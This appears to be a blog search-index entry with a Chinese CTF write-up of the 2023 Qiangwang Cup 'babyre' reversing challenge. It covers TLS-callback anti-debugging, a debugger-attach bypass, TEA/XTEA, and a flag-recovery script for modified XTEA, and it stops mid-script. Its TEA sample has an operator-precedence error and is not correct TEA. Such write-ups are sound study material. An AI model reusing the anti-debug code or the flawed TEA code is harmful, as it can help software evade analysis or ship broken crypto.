<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2023强网杯babyre</title>
    <link href="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/"/>
    <url>/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/</url>
    
    <content type="html"><![CDATA[<p>这道题比赛的时候做了半天也没有做出了，加密部分倒是搞懂了，就是得不到正确的flag，后来看来题解才知道自己的路还有很长</p><span id="more"></span><h3 id="做题前置知识"><a href="#做题前置知识" class="headerlink" title="做题前置知识"></a>做题前置知识</h3><h4 id="TLS反调试机制"><a href="#TLS反调试机制" class="headerlink" title="TLS反调试机制"></a>TLS反调试机制</h4><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">参考文章1</a></p><p><a href="https://www.cnblogs.com/helloylh/p/17209669.html">参考文章2</a></p><p><code>TLS</code>是<code>Thread Local Storage</code>的缩写，即线程局部存储。<strong>主要是为了解决多线程中变量同步的问题</strong>。</p><p>根据我们所学习的<code>OS</code>的知识，进程中的全局变量和函数内的静态变量，是各个线程都可以访问的共享变量，即<code>线程a</code>修改后，<code>线程b</code>访问时就不是原来的了，当然<code>OS</code>利用信号量解决这种同步问题。</p><p>这造成昂贵的同步开销，所以我们选择一种方式使得每个线程可以保有自己的内部变量，被称为<code>static memory local to a thread</code>线程局部静态变量。这一种新的实现机制就是<code>TLS</code></p><p>强网杯这道题具体用的应该是静态绑定</p><p>那么关于TLS在C++中的具体实现应该如下：</p><ol><li><p>编译器声明使用TLS回调</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64       <span class="hljs-comment">//64位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:tls_callback_func&quot;</span>) </span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span>               <span class="hljs-comment">//32位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:__tls_used&quot;</span>) </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:_tls_callback_func&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li><p>编写TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">tls_callback</span><span class="hljs-params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>&#123;<br>    BOOL ret;<br>    <span class="hljs-built_in">CheckRemoteDebuggerPresent</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), &amp;ret);<span class="hljs-comment">//检测是否被调试</span><br>    <span class="hljs-keyword">if</span> (ret) &#123;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//退出程序</span><br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>注册TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg(<span class="hljs-string">&quot;.CRT$XLF&quot;</span>)</span><br>    EXTERN_C <span class="hljs-type">const</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;.CRT$XLF&quot;</span>)        <span class="hljs-comment">//32位</span></span><br>    EXTERN_C<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>PIMAGE_TLS_CALLBACK tls_callback_func[] = &#123; tls_callback,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">//这里是个回调函数数组，可以定义多个，可以为空，0必须加上用于结束</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg()</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()                  <span class="hljs-comment">//32位</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//_WIN64</span></span><br></code></pre></td></tr></table></figure></li></ol><p>至于TLS在程序运行过程中的变化应该是这样的：</p><ol><li><strong>OS加载可执行文件，查找所有TLS回调函数，不用从OEP进去后到主线程执行</strong></li><li><strong>OS在重新启动时（或者线程创建销毁），调用TLS回调函数</strong></li><li><strong>进入（返回）主函数</strong></li></ol><h4 id="TEA加密算法"><a href="#TEA加密算法" class="headerlink" title="TEA加密算法"></a>TEA加密算法</h4><p><a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">参考文章</a></p><p>算法特点：</p><ol><li>使用64位(8byte)明文分组和128位密钥(4*32bit,通常是4个8byte数组)</li><li>sum是用于每轮混淆，每次加δ</li><li>使用Feistel分组加密框架（使用上一轮生成的数据和原始数据的另一半进行XOR异或操作，作为下一轮轮函数的输入），一般为32轮</li></ol><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_15-20-48.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9 <span class="hljs-comment">//常数Delta</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *EntryData,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-comment">// 根据算法，分为8字节一轮</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = EntryData[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = EntryData[<span class="hljs-number">1</span>];<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        sum += delta;<br>        v0 += (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        v1 += (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>    &#125;<br>    EntryData[<span class="hljs-number">0</span>] = v0;<br>    EntryData[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-comment">// 解密，加密反过来就行</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        <span class="hljs-comment">// 先算v1</span><br>        v1 -= (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>        v0 -= (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    &#125;<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>&#125;;<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>&#125;;<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;密文：&quot;</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="XTEA加密算法"><a href="#XTEA加密算法" class="headerlink" title="XTEA加密算法"></a>XTEA加密算法</h4><p>XTEA（TEAN）算法相比于TEA的改变在于：<strong>取哪一个密钥通过sum计算得到，而TEA是固定下标</strong></p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-41.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//sum&amp;3:00,01,11</span><br>        sum += delta;<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//将sum高五位中的低两位获取</span><br>    &#125;<br>    Data[<span class="hljs-number">0</span>] = v0;<br>    Data[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-comment">// 解密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 =Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 =Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>        sum -= delta;<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<br>    &#125;<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt; <span class="hljs-string">&quot;这是XTEA算法!&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>&#125;;<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>&#125;;<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;密文：&quot;</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-02.png"></p><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><h4 id="解决TLS反调试"><a href="#解决TLS反调试" class="headerlink" title="解决TLS反调试"></a>解决TLS反调试</h4><p>首先我们已经知道了这道题加了TLS反调试，然后学习了具体的原理，现在就是实践中去摸索到底时如何实现的。</p><h5 id="寻觅TLS"><a href="#寻觅TLS" class="headerlink" title="寻觅TLS"></a>寻觅TLS</h5><p>打开IDA调试，首先我们进入到程序入口位置，</p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-01-41.png"></p><p>然后一直点击到内层函数，直到此处，重命名为<code>check_DBG</code>，点击进去分析就知道为啥这里是了</p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-03-02.png"></p><p>然后里面是这样的：这里已经很明显用了<code>TLS</code>反调试了，如果返回值表示正在被调试，那么直接退出进程；反之才会进入我们的<code>encrypt_func()</code></p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-05-35.png"></p><p>当然为了更加确认，我们可以在IDA中搜索字符串，发现一个<code>SomeThing Go Wrong\n</code>，点击到该处位置，对函数按<code>x</code>发现交叉引用，发现在两个<code>TLS</code>的<code>callback</code>函数。</p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_10-59-22.png"></p><p>点击到一个回调函数分析：和我上面列举的<code>TLS</code>反调试例子就很像了</p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_11-06-42.png"></p><p>所以可以发现，<strong>如果存在<code>tlsCallback_</code>之类的函数就得小心了，IDA按<code>shift+F7</code>查看代码段，如果存在<code>.tls</code>也得小心了</strong></p><h5 id="反反调试"><a href="#反反调试" class="headerlink" title="反反调试"></a>反反调试</h5><p>至此我们确定<code>babyre</code>这道题使用了<code>TLS</code>来反调试，那么接下来的问题就是如何反反调试，<strong>这里首先有个简单的方法，首先自己运行程序，然后用x64dbg附加进程，就可以动态调试了，但是这样不太方便，每次都要重新跑程序。</strong></p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-01-58.png"></p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-02-28.png"></p><p>通过上面的方法拿到的密文和密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">E0 F2 23 95 93 C2 D8 8E 93 C3 68 86 BC 50 F2 DD<br>99 44 0E 51 44 BD 60 8C F2 AB DC 34 60 D2 0F C1<br><br>62 6F 6D 62<br></code></pre></td></tr></table></figure><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_15-12-03.png"></p><p>这里采用修改汇编代码的方式把反调试给patch掉，笔者也是第一次做这种操作，太菜了😭</p><p>首先需要定位到在哪里我们可以进入正常的加密算法，在上面我们已经分析出来了，就在我们重命名的<code>check_DBG</code>函数里，接下来计算地址，</p><p>(期末考试ing，未完待续)</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>进入主逻辑中的加密算法，首先有0-1、2-3、4-5、6-7两个一组进去加密，根据我们刚刚拿到的密文，可以发现就是一共4组，每组64bit，和上面的TEA和XTEA的输入要求是一样。</p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-01-37.png"></p><p>进入函数分析，发现确实就是一个魔改过的XTEA算法，具体在轮数是33，加密方式变为<code>(v1*5)^(v1&gt;&gt;4)</code>，其他的大差不差的😋</p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-09-55.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0x90508D47</span> - delta*<span class="hljs-number">33</span>*<span class="hljs-number">4</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++)&#123;<br>        sum += delta;<br>        v1 -= ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        v0 -= ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面就是魔改后的XTEA算法的解密脚本，然后在主函数中发现之后还有一个切割逻辑，方便和答案比较，在实际的解密脚本中无需太过关心。</p><p><img src="/2024/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-03_15-27-02.png"></p><p>下面是完整脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x77BF7F99</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x62</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x62</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Encrypted_data[] = <br>&#123;<br>    <span class="hljs-number">0xE0</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0xD8</span>,<span class="hljs-number">0x8E</span>,<br>    <span class="hljs-number">0x93</span>,<span class="hljs-number">0xC3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0xDD</span>,<br>    <span class="hljs-number">0x99</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x8C</span>,<br>    <span class="hljs-number">0xF2</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xDC</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0xC1</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *Data,<span class="hljs-type">uint32_t</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">4</span> ;j++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++)&#123;<br>            v0 += ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>            v1 += ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            sum -= delta;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> Encrypted_data[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<span class="hljs-comment">// - delta*33*4;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">33</span>; ++j)<br>        &#123;<br>            sum -= delta;<br>        &#125;<br>    &#125;<br>    <span 